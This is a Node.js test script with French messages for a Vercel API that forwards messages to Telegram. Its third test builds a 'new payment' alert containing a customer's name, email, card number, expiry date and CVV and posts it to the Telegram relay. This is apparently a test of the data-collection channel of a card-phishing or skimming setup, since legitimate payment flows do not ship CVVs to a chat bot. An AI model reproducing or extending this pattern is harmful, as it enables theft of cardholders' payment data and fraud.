const fetch = require('node-fetch');

console.log('🧪 TEST D\'INTÉGRATION VERCEL');
console.log('=============================');

const VERCEL_API_URL = 'https://test-alpha-lac-68.vercel.app/api/telegram';
const NOTIFICATIONS_URL = 'https://test-alpha-lac-68.vercel.app/api/notifications';

async function testVercelAPI() {
    try {
        console.log('\n📡 Test 1: Envoi d\'un message via Vercel');
        console.log('----------------------------------------');
        
        const response = await fetch(VERCEL_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: '🧪 TEST D\'INTÉGRATION VERCEL !\n✅ API accessible depuis l\'interface desktop\n📱 Vérifiez Telegram',
                type: 'test'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Message envoyé avec succès !');
            console.log('📱 Message ID:', result.telegramResponse?.result?.message_id);
            console.log('📄 Contenu:', result.telegramResponse?.result?.text);
        } else {
            console.error('❌ Erreur lors de l\'envoi:', result.error);
        }
        
        return result;
        
    } catch (error) {
        console.error('❌ Erreur lors du test Vercel:', error);
        return { success: false, error: error.message };
    }
}

async function testNotificationsAPI() {
    try {
        console.log('\n📨 Test 2: Récupération des notifications');
        console.log('----------------------------------------');
        
        const response = await fetch(NOTIFICATIONS_URL);
        const data = await response.json();
        
        if (data.success && data.notifications) {
            console.log(`✅ ${data.notifications.length} notifications trouvées`);
            
            if (data.notifications.length > 0) {
                const lastNotification = data.notifications[data.notifications.length - 1];
                console.log('📋 Dernière notification:');
                console.log('   ID:', lastNotification.id);
                console.log('   Heure:', lastNotification.timestamp);
                console.log('   Contenu:', lastNotification.message.substring(0, 100) + '...');
            }
        } else {
            console.log('📭 Aucune notification trouvée');
        }
        
        return data;
        
    } catch (error) {
        console.error('❌ Erreur lors de la récupération des notifications:', error);
        return { success: false, error: error.message };
    }
}

async function testPaymentFlow() {
    try {
        console.log('\n💳 Test 3: Simulation d\'un paiement complet');
        console.log('--------------------------------------------');
        
        const paymentData = {
            customerName: 'Client Test Vercel',
            email: 'test@vercel.com',
            amount: '149.99',
            cardNumber: '4111 **** **** 1111',
            expiry: '12/25',
            cvv: '123'
        };
        
        const message = `💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: ${paymentData.customerName}
📧 Email: ${paymentData.email}
💳 Carte: ${paymentData.cardNumber}
📅 Expiration: ${paymentData.expiry}
🔐 CVV: ${paymentData.cvv}
💶 Montant: ${paymentData.amount}€
🔒 Vérifiez immédiatement !`;
        
        const response = await fetch(VERCEL_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: message,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Paiement simulé avec succès !');
            console.log('📱 Message ID:', result.telegramResponse?.result?.message_id);
            console.log('💰 Montant:', paymentData.amount + '€');
        } else {
            console.error('❌ Erreur simulation paiement:', result.error);
        }
        
        return result;
        
    } catch (error) {
        console.error('❌ Erreur simulation paiement:', error);
        return { success: false, error: error.message };
    }
}

async function runAllTests() {
    console.log('🚀 Démarrage des tests d\'intégration Vercel...\n');
    
    // Test 1: Envoi de message
    const messageResult = await testVercelAPI();
    
    // Attendre un peu
    console.log('\n⏳ Attente de 2 secondes...');
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Test 2: Récupération des notifications
    const notificationsResult = await testNotificationsAPI();
    
    // Attendre un peu
    console.log('\n⏳ Attente de 2 secondes...');
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Test 3: Simulation de paiement
    const paymentResult = await testPaymentFlow();
    
    // Résumé
    console.log('\n📊 RÉSUMÉ DES TESTS');
    console.log('==================');
    console.log('📡 Envoi message:', messageResult.success ? '✅ Réussi' : '❌ Échec');
    console.log('📨 Récupération notifications:', notificationsResult.success ? '✅ Réussi' : '❌ Échec');
    console.log('💳 Simulation paiement:', paymentResult.success ? '✅ Réussi' : '❌ Échec');
    
    if (messageResult.success && notificationsResult.success && paymentResult.success) {
        console.log('\n🎉 TOUS LES TESTS SONT PASSÉS !');
        console.log('✅ L\'intégration Vercel fonctionne correctement');
        console.log('📱 Vérifiez votre Telegram pour voir les messages');
    } else {
        console.log('\n❌ Certains tests ont échoué');
        console.log('🔧 Vérifiez la configuration Vercel');
    }
}

// Exécuter les tests
runAllTests().catch(console.error);
